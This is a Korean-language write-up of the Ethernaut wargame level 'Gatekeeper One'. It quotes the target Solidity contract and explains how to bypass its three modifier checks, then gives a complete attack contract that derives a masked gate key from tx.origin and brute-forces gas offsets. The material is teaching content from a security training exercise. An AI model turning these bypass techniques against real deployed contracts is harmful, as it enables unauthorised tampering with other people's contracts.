# Ethernaut Level 13 - Gatekeeper One

## 문제 설명

세 가지 modifier 조건을 모두 통과하여 `entrant`로 등록하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

## 취약점 분석

### Gate 1
중간 컨트랙트를 통해 호출 → `msg.sender != tx.origin`

### Gate 2
`gasleft() % 8191 == 0` 조건 → 브루트포스로 가스값 조정

### Gate 3 — gateKey 계산

`tx.origin` = 내 지갑 주소 예시: `0x...AABB`

```
조건 1: uint32(key) == uint16(key)
→ 하위 4바이트의 상위 2바이트가 0x0000 이어야 함
→ key의 bytes 5~6 = 0x0000

조건 2: uint32(key) != uint64(key)
→ 상위 4바이트는 0이 아니어야 함

조건 3: uint32(key) == uint16(tx.origin)
→ key의 하위 2바이트 = tx.origin의 하위 2바이트
```

최종 키 계산:
```solidity
bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    function attack(address _target) public {
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint256 i = 0; i < 300; i++) {
            (bool success,) = _target.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) break;
        }
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포 후 attack 실행

```
_target : GatekeeperOne 인스턴스 주소
```

### Step 2 — 확인

```js
await contract.entrant()
// → 내 지갑 주소
```

---

## 핵심 교훈

- `tx.origin != msg.sender` 체크는 중간 컨트랙트로 우회 가능
- 가스 기반 조건은 하드포크마다 변경될 수 있어 불안정
- 타입 변환(casting)에 의한 비트 손실을 주의해야 함
